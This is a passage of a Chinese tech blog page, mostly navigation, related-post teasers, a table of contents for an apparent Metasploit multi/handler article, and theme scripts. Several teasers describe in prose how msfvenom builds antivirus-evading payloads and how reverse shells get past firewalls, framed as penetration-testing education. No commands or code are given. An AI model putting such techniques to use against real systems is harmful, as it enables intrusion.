Tool)，用于执行构建任务。  核心思想：CMake 负责“生成”跨平台的构建配置 (如 Makefile)，而 Make 负责“执行”这些配置来实际编译代码。   一、Make：低级构建工具1.1 什么是 Make？Make 是一个自动化构建工具 (Build Automation Tool)，它的核心职责是读取一个名为 Makefile 的文件，根据文件中定义的规则和依赖关系，执行相应的命令来构建项目。Make 在 Unix&#x2F;Linux 系统上历史悠久且广泛应用，是构建 C&#x2F;C++ 项目的基础工具之一。 1.2 MakefileMakefile 是 Make 工具的配置文件，它定义了：  目标 (Targ...</div></div></div></a><a class="pagination-related" href="/b00b15ffe0de/" title="日志采集方案Loki详解：轻量、高效、可扩展"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-19.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">日志采集方案Loki详解：轻量、高效、可扩展</div></div><div class="info-2"><div class="info-item-1"> Loki 是由 Grafana Labs 构建的一款开源的、多租户日志聚合系统，它与其他日志系统最大的不同在于它不索引日志内容，只索引日志的元数据 (labels)。这种设计思路使得 Loki 在存储和查询方面都非常高效和经济，尤其适合与 Prometheus 和 Grafana 配合使用，形成一个完整的可观测性栈。  核心理念：日志不是用来全文搜索的，而是用来从标签维度过滤的。   一、传统日志系统的痛点在理解 Loki 之前，我们先回顾一下传统日志系统（如 Elasticsearch + Logstash + Kibana，即 ELK 栈）在使用中可能遇到的问题：  存储成本高昂：为了实现全文搜索，ELK 会为每条日志的全部内容建立倒排索引。这导致索引数据量巨大，通常是原始日志的数倍，存储成本显著增加。 维护复杂：ELK 栈组件多，部署和维护复杂，对系统资源要求高。 计算资源消耗大：全文搜索对 CPU 和内存消耗巨大，尤其是在处理海量日志时。 实时性挑战：索引构建需要时间，查询实时性可能受影响。  Loki 的出现就是旨在解决这些痛点，提供一个更轻量、更经济的日志解决方案。...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/29965d782f2a/" title="Metasploit 框架详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-31.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-18</div><div class="info-item-2">Metasploit 框架详解</div></div><div class="info-2"><div class="info-item-1"> Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1 什么是 Metasploit？Metasploit 是由 Rapid7 公司维护的一个著名的开源项目。它是一个漏洞利用框架，旨在协助渗透测试人员识别、利用和验证漏洞。它不仅仅是一个简单的漏洞扫描器，更是一个提供多种工具和方法的集成环境，几乎覆盖了渗透测试的整个生命周期。 1.2 Metasploit 的发展历史 2003年：由 H.D. Moore 发起，最初是一个 Perl 语言的项目。 2004年：发布 2.0 版本，首次引入了模块化架构。 2007年：框架被重写，使用 Ruby 语言，提高了灵活性和可维护性。 209年：Rapid7 收购 Metasploit 项目，并继续其开发...</div></div></div></a><a class="pagination-related" href="/1c9fa79b93e5/" title="Msfvenom 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-24.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-26</div><div class="info-item-2">Msfvenom 详解</div></div><div class="info-2"><div class="info-item-1"> Msfvenom 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 msfpayload（载荷生成器）和 msfencode（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。  核心思想：将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离，允许用户自由组合并按需编码，生成高度定制化的恶意文件。   一、Msfvenom 简介1.1 什么是 Msfvenom？msfvenom 是一个命令行工具，属于 Metasploit Framework 的一部分。它的主要功能是：  载荷生成 (Payload Generation)：创建各种操作系统（Windows, Linux, macOS, Android 等）和架构（x86, x64 等）的恶意载荷。 编码 (Encoding)：对生成的载荷进行编码，以尝试绕过杀毒软件的签名检测或处理特殊字符（如 NUL \x00）。 格式化 (Formatting)：将生成的载荷输出为多种文...</div></div></div></a><a class="pagination-related" href="/1046db413419/" title="Reverse TCP Shell 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-03.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-07</div><div class="info-item-2">Reverse TCP Shell 详解</div></div><div class="info-2"><div class="info-item-1"> Reverse TCP Shell (反向 TCP Shell) 是一种在渗透测试和恶意软件领域中广泛使用的技术，它允许攻击者在受害机器上获得一个交互式命令行会话。与传统的正向连接 Shell (Bind Shell) 不同，反向 Shell 的连接方向是从受害机器到攻击机器，这使得它在穿越防火墙和 NAT 设备方面具有显著优势。  核心思想：攻击者在其机器上设置一个监听器，等待受害机器主动发起连接，从而绕过目标网络对入站连接的限制。   一、Shell 简介在计算机系统中，Shell (命令行解释器) 是用户与操作系统内核进行交互的接口。通过 Shell，用户可以输入命令来执行程序、管理文件和系统资源等。 在渗透测试中，获取目标系统的 Shell 权限是至关重要的一步，它意味着攻击者可以在目标机器上执行任意命令。 1.1 Shell 的分类 命令行 Shell (Command Shell)：  提供基本的命令行交互界面，如 Windows 的 cmd.exe 或 PowerShell，Linux 的 bash 或 sh。 功能相对简单，通常需要手动输入命令。   高级 Sh...</div></div></div></a><a class="pagination-related" href="/964ae22dfd06/" title="渗透测试原理详解：深入了解网络安全攻防"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-16</div><div class="info-item-2">渗透测试原理详解：深入了解网络安全攻防</div></div><div class="info-2"><div class="info-item-1"> 渗透测试（Penetration Testing） 是一种有目的、有计划的模拟攻击行为，旨在评估信息系统、网络、应用程序或组织的安全防护能力。它模拟恶意攻击者可能使用的技术和方法，主动发现系统中的安全漏洞、弱点和配置错误，并评估这些漏洞可能造成的潜在影响。渗透测试的最终目标是帮助组织识别并修复安全缺陷，提高整体的安全韧性，而非破坏或窃取数据。  核心思想：渗透测试像一次“模拟实战演习”，由专业的“红队”（渗透测试人员）扮演“黑客”，通过合法授权的攻击手段，挑战组织的“蓝队”（安全防护系统），从而发现真实世界中可能存在的安全盲点和薄弱环节。   一、为什么需要渗透测试？在当今高度互联的世界中，网络攻击日益频繁且复杂。传统的安全审计、漏洞扫描、代码审查等方法虽然重要，但它们往往局限于静态分析或已知漏洞的检测。渗透测试的价值在于：  主动发现未知漏洞：通过模拟真实攻击者的思维和手法，发现仅靠工具扫描难以识别的逻辑漏洞、业务漏洞和组合漏洞。 验证安全控制的有效性：测试已部署的安全设备（如防火墙、IDS&#x2F;IPS）、安全策略和人员响应机制是否能有效抵御攻击。 评估业务影响：清晰地...</div></div></div></a><a class="pagination-related" href="/fc0a62ae56f9/" title="OAuth2.0详解：现代授权框架的核心原理与应用"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-06.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">OAuth2.0详解：现代授权框架的核心原理与应用</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0（Open Authorization）是一个开放标准，定义了一套授权流程，允许用户（资源所有者）授权第三方应用访问他们在另一个服务提供者（授权服务器）上的受保护资源（资源服务器），而无需将自己的用户名和密码直接提供给第三方应用。它主要解决的是委托授权的问题，即“我授权应用A去访问我在服务B上的某些数据”。  核心区分：OAuth 2.0 是一个授权（Authorization）框架，而不是用来做认证（Authentication）。尽管它常常与认证机制（如 OpenID Connect）结合使用，但其核心职责是授予对资源的访问权限，而非验证用户身份。   一、OAuth 2.0 产生的背景与解决的问题在 OAuth 出现之前，如果一个第三方应用需要访问用户在其他服务（如 Google 相册、GitHub 代码库）上的数据，用户通常需要将自己的账号密码直接告知第三方应用。这种做法带来了严重的安全和便捷性问题：  凭据泄露风险：第三方应用一旦被攻破，或恶意使用，用户的完整凭据就会泄露，导致所有关联服务面临风险。 权限过大：第三方应用获得的是用户的完全控制权，无法...</div></div></div></a><a class="pagination-related" href="/902d004f5ccc/" title="浏览器指纹 (Browser Fingerprinting) 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-26.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">浏览器指纹 (Browser Fingerprinting) 详解</div></div><div class="info-2"><div class="info-item-1"> 浏览器指纹 (Browser Fingerprinting) 是一种用于识别或追踪用户在线行为的技术，即使在用户清除了 cookies、使用无痕模式甚至更换 IP 地址之后，它也能尝试标识出唯一的用户或设备。与 cookies 不同，浏览器指纹不是存储在用户设备上的数据，而是通过收集用户浏览器的各种配置和设置信息来生成的。  “你的浏览器就像你的手纹一样，看似普通，却独一无二。”   一、什么是浏览器指纹？浏览器指纹是指网站或在线服务通过收集用户浏览器和设备的大量可公开信息（如操作系统、浏览器类型和版本、屏幕分辨率、字体、插件、MIME 类型、时区、语言设置、GPU 信息、Canvas 渲染结果、AudioContext 信息等），并将这些信息综合起来生成一个近似唯一的“指纹”，从而在一定概率上识别单个用户或设备的技术。 这个“指纹”的强大之处在于其持久性和隐蔽性，用户很难通过常规手段进行清除或规避。 二、浏览器指纹的工作原理网站通过 JavaScript 或其他客户端脚本，在用户访问时执行一系列操作来获取其浏览器和设备特征。这些特征包括： 1. HTTP 请求头信息 (HTT...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">TeaTang</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">306</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">199</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">69</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/teatang"><i class="fab fa-github"></i><span>GitHub主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:tea.tang1211@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站更多功能即将上线，敬请期待！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81exploit-multi-handler-%E7%AE%80%E4%BB%8B"><span class="toc-text">一、exploit&#x2F;multi&#x2F;handler 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-exploit-multi-handler%EF%BC%9F"><span class="toc-text">1.1 什么是 exploit&#x2F;multi&#x2F;handler？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-handler%EF%BC%9F"><span class="toc-text">1.2 为什么需要 handler？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81exploit-multi-handler-%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-text">二、exploit&#x2F;multi&#x2F;handler 的配置与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-text">2.1 基本使用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E7%A4%BA%E4%BE%8B-%E7%BB%93%E5%90%88-msfvenom"><span class="toc-text">2.2 示例 (结合 msfvenom)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-handler-%E7%9A%84%E9%AB%98%E7%BA%A7%E9%80%89%E9%A1%B9"><span class="toc-text">2.3 handler 的高级选项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81exploit-multi-handler-%E4%B8%8E%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-text">三、exploit&#x2F;multi&#x2F;handler 与其他模块的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">四、安全注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">五、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/fae19f12de23/" title="压缩字典树 (Radix Trie/Patricia Trie) 深度解析"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-01.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="压缩字典树 (Radix Trie/Patricia Trie) 深度解析"/></a><div class="content"><a class="title" href="/fae19f12de23/" title="压缩字典树 (Radix Trie/Patricia Trie) 深度解析">压缩字典树 (Radix Trie/Patricia Trie) 深度解析</a><time datetime="2025-11-17T22:24:00.000Z" title="发表于 2025-11-18 06:24:00">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c28be5a597e1/" title="Golang 内存对齐详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-21.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Golang 内存对齐详解"/></a><div class="content"><a class="title" href="/c28be5a597e1/" title="Golang 内存对齐详解">Golang 内存对齐详解</a><time datetime="2025-11-12T22:24:00.000Z" title="发表于 2025-11-13 06:24:00">2025-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/7419af632339/" title="Golang 空结构体 (struct{}) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Golang 空结构体 (struct{}) 详解"/></a><div class="content"><a class="title" href="/7419af632339/" title="Golang 空结构体 (struct{}) 详解">Golang 空结构体 (struct{}) 详解</a><time datetime="2025-11-10T22:24:00.000Z" title="发表于 2025-11-11 06:24:00">2025-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/b100840425a8/" title="Codex 详解与使用技巧：OpenAI 的代码智能模型"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Codex 详解与使用技巧：OpenAI 的代码智能模型"/></a><div class="content"><a class="title" href="/b100840425a8/" title="Codex 详解与使用技巧：OpenAI 的代码智能模型">Codex 详解与使用技巧：OpenAI 的代码智能模型</a><time datetime="2025-11-06T22:24:00.000Z" title="发表于 2025-11-07 06:24:00">2025-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/6d28d801758d/" title="Claude Code 详解：Anthropic 的代码智能模型"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-09.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Claude Code 详解：Anthropic 的代码智能模型"/></a><div class="content"><a class="title" href="/6d28d801758d/" title="Claude Code 详解：Anthropic 的代码智能模型">Claude Code 详解：Anthropic 的代码智能模型</a><time datetime="2025-11-04T22:24:00.000Z" title="发表于 2025-11-05 06:24:00">2025-11-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover/default_cover-30.jpg);"><div class="footer-flex"><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">我的轨迹</div><div class="footer-flex-content"><a href="/archives/2023/" target="_blank" title="📌 2023">📌 2023</a><a href="/archives/2024/" target="_blank" title="❓ 2024">❓ 2024</a><a href="/archives/2025/" target="_blank" title="🚀 2025">🚀 2025</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">维度</div><div class="footer-flex-content"><a href="/categories/" target="_blank" title="分类">分类</a><a href="/tags/" target="_blank" title="标签">标签</a><a href="/categories/" target="_blank" title="时间线">时间线</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">其他</div><div class="footer-flex-content"><a href="/shuoshuo" target="_blank" title="说说">说说</a></div></div></div></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2021 - 2025 By TeaTang</span><span class="framework-info"><span class="footer-separator">|</span><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const applyThemeDefaultsConfig = theme => {
+    if (theme === 'dark-mode') {
+      Chart.defaults.color = "rgba(255, 255, 255, 0.8)"
+      Chart.defaults.borderColor = "rgba(255, 255, 255, 0.2)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    } else {
+      Chart.defaults.color = "rgba(0, 0, 0, 0.8)"
+      Chart.defaults.borderColor = "rgba(0, 0, 0, 0.1)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    }
+  }
+
+  // Recursively traverse the config object and automatically apply theme-specific color schemes
+  const applyThemeConfig = (obj, theme) => {
+    if (typeof obj !== 'object' || obj === null) return
+
+    Object.keys(obj).forEach(key => {
+      const value = obj[key]
+      // If the property is an object and has theme-specific options, apply them
+      if (typeof value === 'object' && value !== null) {
+        if (value[theme]) {
+          obj[key] = value[theme] // Apply the value for the current theme
+        } else {
+          // Recursively process child objects
+          applyThemeConfig(value, theme)
+        }
+      }
+    })
+  }
+
+  const runChartJS = ele => {
+    window.loadChartJS = true
+
+    Array.from(ele).forEach((item, index) => {
+      const chartSrc = item.firstElementChild
+      const chartID = item.getAttribute('data-chartjs-id') || ('chartjs-' + index) // Use custom ID or default ID
+      const width = item.getAttribute('data-width')
+      const existingCanvas = document.getElementById(chartID)
+
+      // If a canvas already exists, remove it to avoid rendering duplicates
+      if (existingCanvas) {
+          existingCanvas.parentNode.remove()
+      }
+
+      const chartDefinition = chartSrc.textContent
+      const canvas = document.createElement('canvas')
+      canvas.id = chartID
+
+      const div = document.createElement('div')
+      div.className = 'chartjs-wrap'
+
+      if (width) {
+        div.style.width = width
+      }
+
+      div.appendChild(canvas)
+      chartSrc.insertAdjacentElement('afterend', div)
+
+      const ctx = document.getElementById(chartID).getContext('2d')
+
+      const config = JSON.parse(chartDefinition)
+
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark-mode' : 'light-mode'
+
+      // Set default styles (initial setup)
+      applyThemeDefaultsConfig(theme)
+
+      // Automatically traverse the config and apply dual-mode color schemes
+      applyThemeConfig(config, theme)
+
+      new Chart(ctx, config)
+    })
+  }
+
+  const loadChartJS = () => {
+    const chartJSEle = document.querySelectorAll('#article-container .chartjs-container')
+    if (chartJSEle.length === 0) return
+
+    window.loadChartJS ? runChartJS(chartJSEle) : btf.getScript('https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.min.js').then(() => runChartJS(chartJSEle))
+  }
+
+  // Listen for theme change events
+  btf.addGlobalFn('themeChange', loadChartJS, 'chartjs')
+  btf.addGlobalFn('encrypt', loadChartJS, 'chartjs')
+
+  window.pjax ? loadChartJS() : document.addEventListener('DOMContentLoaded', loadChartJS)
+})()</script></div><script data-pjax src="/self/btf.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="ture"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,200,200" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      true
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script>(() => {
+  const option = null
+  const config = {"site_uv":true,"site_pv":true,"page_pv":true,"token":"qTvz1SkmPDt785fgh6BpiA5qiFFIVUwxj8Ft+rPW+cdN59v1hXjwRgSmy0+ji9m+oLlcxvo2NfDSMa6epVl3NTlsN3ejCIwWeP8Y51aEJ0Sbem4UexGmJLspB7AkOBId2SdtT6QWEBlGmFIIQgchQ2zAKYxTmc/kpBED5aLSr+3uvmQ9/G7FJQeVFpveDkK0xM1hu36xq4a6/FSeROxtoEp5zabzTWiYTlLsQzIl/NlELnCq3nxK+oo/vl3UQo/oM/rae/gJX/MaVKsgIUCd2ABJogNkx2KTenBIBpbPki5FzOgPh6/z4GPa4HvhNO51DDVG1SEQZooqEYmt/gnybLBWFbN+7liZWw=="}
+
+  const runTrack = () => {
+    if (typeof umami !== 'undefined' && typeof umami.track === 'function') {
+      umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
+    } else {
+      console.warn('Umami Analytics: umami.track is not available')
+    }
+  }
+
+  const loadUmamiJS = () => {
+    btf.getScript('https://umami.012700.xyz/script.js', {
+      'data-website-id': '2a796d6c-6499-42d8-8eb4-d9a2930b0ff3',
+      'data-auto-track': 'false',
+      ...option
+    }).then(() => {
+      runTrack()
+    }).catch(error => {
+      console.error('Umami Analytics: Error loading script', error)
+    })
+  }
+
+  const getData = async (isPost) => {
+    try {
+      const now = Date.now()
+      const keyUrl = isPost ? `&url=${window.location.pathname}` : ''
+      const headerList = { 'Accept': 'application/json' }
+
+      if (true) {
+        headerList['Authorization'] = `Bearer ${config.token}`
+      } else {
+        headerList['x-umami-api-key'] = config.token
+      }
+
+      const res = await fetch(`https://umami.012700.xyz/api/websites/2a796d6c-6499-42d8-8eb4-d9a2930b0ff3/stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
+        method: "GET",
+        headers: headerList
+      })
+
+      if (!res.ok) {
+        throw new Error(`HTTP error! status: ${res.status}`)
+      }
+
+      return await res.json()
+    } catch (error) {
+      console.error('Umami Analytics: Failed to fetch data', error)
+      throw error
+    }
+  }
+
+  const insertData = async () => {
+    try {
+      if (GLOBAL_CONFIG_SITE.pageType === 'post' && config.page_pv) {
+        const pagePV = document.getElementById('umamiPV')
+        if (pagePV) {
+          const data = await getData(true)
+          if (data && data.pageviews && typeof data.pageviews.value !== 'undefined') {
+            pagePV.textContent = data.pageviews.value
+          } else {
+            console.warn('Umami Analytics: Invalid page view data received')
+          }
+        }
+      }
+
+      if (config.site_uv || config.site_pv) {
+        const data = await getData(false)
+
+        if (config.site_uv) {
+          const siteUV = document.getElementById('umami-site-uv')
+          if (siteUV && data && data.visitors && typeof data.visitors.value !== 'undefined') {
+            siteUV.textContent = data.visitors.value
+          } else if (siteUV) {
+            console.warn('Umami Analytics: Invalid site UV data received')
+          }
+        }
+
+        if (config.site_pv) {
+          const sitePV = document.getElementById('umami-site-pv')
+          if (sitePV && data && data.pageviews && typeof data.pageviews.value !== 'undefined') {
+            sitePV.textContent = data.pageviews.value
+          } else if (sitePV) {
+            console.warn('Umami Analytics: Invalid site PV data received')
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Umami Analytics: Failed to insert data', error)
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
+  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')
+
+
+  loadUmamiJS()
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', insertData)
+  } else {
+    setTimeout(insertData, 100)
+  }
